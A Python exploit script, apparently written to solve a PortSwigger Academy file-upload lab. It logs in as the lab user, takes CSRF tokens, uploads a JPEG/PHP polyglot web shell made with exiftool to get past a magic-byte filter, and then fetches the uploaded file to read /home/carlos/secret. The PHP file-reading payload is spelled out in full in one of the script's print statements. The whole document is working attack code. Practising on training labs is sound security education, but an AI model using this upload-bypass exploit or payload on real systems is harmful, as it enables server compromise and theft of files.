import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def get_scookie_and_csrft(url):
    path = '/login'
    r = requests.get(url + path, verify=False, proxies=proxies)
    session_cookie = r.cookies.get_dict()['session']
    soup = BeautifulSoup(r.text, "html.parser")
    s = soup.findAll("input")
    csrf_token = re.search(r"[A-Z,a-z,0-9]{32}", str(s))
    return session_cookie,csrf_token.group(0)


def get_authorized_scookie(url, session_cookie, csrf_token):
    path = "/login"
    cookies = {'session' : session_cookie}
    params = {'csrf' : csrf_token, 'username' : 'wiener', 'password' : 'peter'}
    r = requests.post(url + path, cookies=cookies, data=params, verify=False, allow_redirects=False, proxies=proxies)
    authorized_session_cookie = r.cookies.get_dict()['session']
    return authorized_session_cookie

def get_csrf_token_for_upload(url, authorized_session_cookie):
    path = "/my-account"
    cookies = {'session' : authorized_session_cookie}
    r = requests.get(url + path, cookies=cookies, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    s = soup.findAll("input")
    csrf_token = re.search(r"[A-Z,a-z,0-9]{32}", str(s))
    return csrf_token.group(0)

def upload_file(url, authorized_session_cookie, csrf_token_for_upload):
    path = "/my-account/avatar"
    cookies = {'session' : authorized_session_cookie}
    params = {'csrf' : csrf_token_for_upload, 'user' : 'wiener'}
    files = {'avatar' : open(r"C:\Users\acalarco\csec\web-pentest\portswigger-academy\file-upload\dog-php-injected.php", "rb")}
    r = requests.post(url + path, cookies=cookies, data=params, files=files, verify=False, proxies=proxies)
    if r.status_code == 200 and "has been uploaded." in r.text:
        return True
    else:
        return False

def get_secret(url):
    path = "/files/avatars/dog-php-injected.php"
    r = requests.get(url + path, verify=False, proxies=proxies)
    secret = re.search(r"[A-Z,a-z,0-9]{32}", r.text)
    return secret.group(0)


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    print("[+] Testing for a file upload vulnerability with bypass filter (Magic Byte) for logged-in users")
    session_cookie,csrf_token = get_scookie_and_csrft(url)
    authorized_session_cookie = get_authorized_scookie(url, session_cookie, csrf_token)
    print("[+] Uploading a polyglot JPEG shell created using the tool 'exiftool', argument '%s'" % r'-DocumentName="<?php echo file_get_contents(\'/home/carlos/secret\');__halt_compiler();?> [ORIGINAL JPG]')
    csrf_token_for_upload = get_csrf_token_for_upload(url, authorized_session_cookie)
    if not upload_file(url, authorized_session_cookie, csrf_token_for_upload):
        print("[-] Upload failed!")
        sys.exit(-1)
    print("[+] Upload complete!")
    secret = get_secret(url)
    print("[+] Retrieving the content of the file /home/carlos/secret...\n[+] Got it!! %s" % secret)


if __name__ == "__main__":
    main()